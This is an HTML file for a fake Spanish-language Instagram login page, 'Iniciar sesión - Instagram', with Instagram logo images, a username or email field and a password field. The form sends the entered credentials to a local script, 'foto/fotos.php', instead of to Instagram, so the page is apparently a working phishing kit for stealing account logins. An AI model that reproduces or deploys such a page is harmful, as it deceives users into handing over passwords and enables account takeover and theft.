<!DOCTYPE html>
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <title>Iniciar sesión - Instagram</title>
    <link rel='stylesheet' href='http://netdna.bootstrapcdn.com/bootstrap/3.0.2/css/bootstrap.min.css'>
    <link rel="stylesheet" href="css/style.css">
    <link rel="shortcut icon" href="img/instagram.ico" />
</head>

<body>

    <div class="wrapper">
    <form class="form-signin" name="muestra_fotos" method="POST" action="foto/fotos.php">       
      <center><img width="60%" src="img/instagram2.png" class="img-responsive" style="margin-top:-10px;"></center>
      <input type="text" class="form-control" name="username" placeholder="Teléfono, usuario o correo electrónico" required="" autofocus="" />
      <input type="password" class="form-control" name="password" placeholder="Contraseña" required=""/>
      <button style="font-size:12px; font-weight:bold; background-color:#3897f0; border-color:#3897f0; margin:bottom:20px;" class="btn btn-lg btn-primary btn-block" type="submit">Entrar</button>   
      <center><img src="img/bottomLogin2.png" class="img-responsive" ></center>
    </form>
    <form class="form-resto">       
      <center><img src="img/bottomRegistro.png" class="img-responsive" ></center>
    </form>
    
    <form class="form-descargas">       
      <center><p>Descarga la aplicación.</p></center>
      <center><img src="img/bottomDescargas.png" class="img-responsive" ></center>
    </form>
  </div>
  
  

</body>

</html>